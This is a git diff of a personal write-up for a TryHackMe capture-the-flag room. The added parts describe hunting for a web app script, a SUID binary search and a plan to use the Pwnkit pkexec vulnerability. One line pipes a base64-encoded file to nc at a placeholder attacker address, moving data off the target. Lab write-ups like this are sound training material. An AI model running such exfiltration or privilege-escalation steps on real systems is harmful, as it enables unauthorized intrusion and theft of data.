@@ -1,5 +1,5 @@
 ---
-{"dg-publish":true,"permalink":"/try-hack-me-rooms/convert-my-video/","tags":["ethicalhacking","offensivesecurity","tryhackme","pentesting","writeup"],"created":"2026-04-28T07:22:40.350+02:00","updated":"2026-05-04T20:32:14.762+02:00","dg-note-properties":{"tags":["ethicalhacking","offensivesecurity","tryhackme","pentesting","writeup"]}}
+{"dg-publish":true,"permalink":"/try-hack-me-rooms/convert-my-video/","tags":["ethicalhacking","offensivesecurity","tryhackme","pentesting","writeup"],"created":"2026-04-28T07:22:40.350+02:00","updated":"2026-05-04T20:45:54.787+02:00","dg-note-properties":{"tags":["ethicalhacking","offensivesecurity","tryhackme","pentesting","writeup"]}}
 ---
 
 ![](/img/user/Attachments/redteaming2.png)
@@ -267,6 +267,8 @@ Unfortunately **.gnupg** is read/write only by root.
 
 -----
 
+### Looking for the YT-dl script
+
 Thinking about the fact that the room uses a script on the webapp, this script might lead to valuable information. Let's look for it via the shell connection. 
 
 ![](/img/user/Attachments/grep-for-yt-dl.png)
@@ -292,6 +294,20 @@ base64 'file_goes_here' | nc <IP> <PORT> > saved_file
 ```
 
 However base64 encoding the file and piping it to nc works just fine. Only downside is having to still manually cat the content of the file. Sadly examining the file on my machine doesnt reveal much. It does confirm that it is the same script running on the webapp. 
+
+----
+
+### Time to look at SUID-binaries
+
+![](/img/user/Attachments/suidbinaries.png)
+
+```bash
+find / -type -perm /4000 2>/dev/null
+```
+
+Sure enough the well known Pwnkit vulnerability exist on this target. **/usr/bin/pkexec** binary confirms this finding. Let's get to it. 
+
+
 
 
 ------
